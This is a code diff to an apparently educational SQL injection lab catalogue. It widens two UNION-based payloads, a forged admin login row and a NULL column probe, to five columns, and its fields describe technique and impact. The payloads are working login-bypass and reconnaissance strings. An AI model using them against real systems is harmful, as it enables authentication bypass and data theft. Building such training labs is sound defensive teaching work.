@@ -176,14 +176,14 @@ export const PAYLOADS: SqlPayload[] = [
   {
     id: "union-forge",
     name: "UNION forged row",
-    payload: "' UNION SELECT 1,'admin','x' --",
+    payload: "' UNION SELECT 1,'admin','x','x','2026-01-01' --",
     field: "username",
     category: "union",
     desc: "Appends a forged result row with admin credentials.",
     technique:
       "UNION SELECT merges a second result set. The attacker crafts columns to match the original query shape.",
     exampleQuery:
-      "SELECT * FROM users WHERE username='' UNION SELECT 1,'admin','x' --' AND password='...'",
+      "SELECT * FROM users WHERE username='' UNION SELECT 1,'admin','x','x','2026-01-01' --' AND password='...'",
     impact: "Data extraction or forged login row without valid credentials.",
     severity: "critical",
     worksInLab: true,
@@ -191,14 +191,14 @@ export const PAYLOADS: SqlPayload[] = [
   {
     id: "union-null",
     name: "UNION null probe",
-    payload: "' UNION SELECT null,null,null --",
+    payload: "' UNION SELECT null,null,null,null,null --",
     field: "username",
     category: "union",
     desc: "Probes column count with NULL placeholders.",
     technique:
       "Attackers use UNION SELECT null,... to discover how many columns the query returns before injecting real data.",
     exampleQuery:
-      "SELECT * FROM users WHERE username='' UNION SELECT null,null,null --' AND password='...'",
+      "SELECT * FROM users WHERE username='' UNION SELECT null,null,null,null,null --' AND password='...'",
     impact: "Reconnaissance step toward full UNION-based data theft.",
     severity: "medium",
     worksInLab: true,
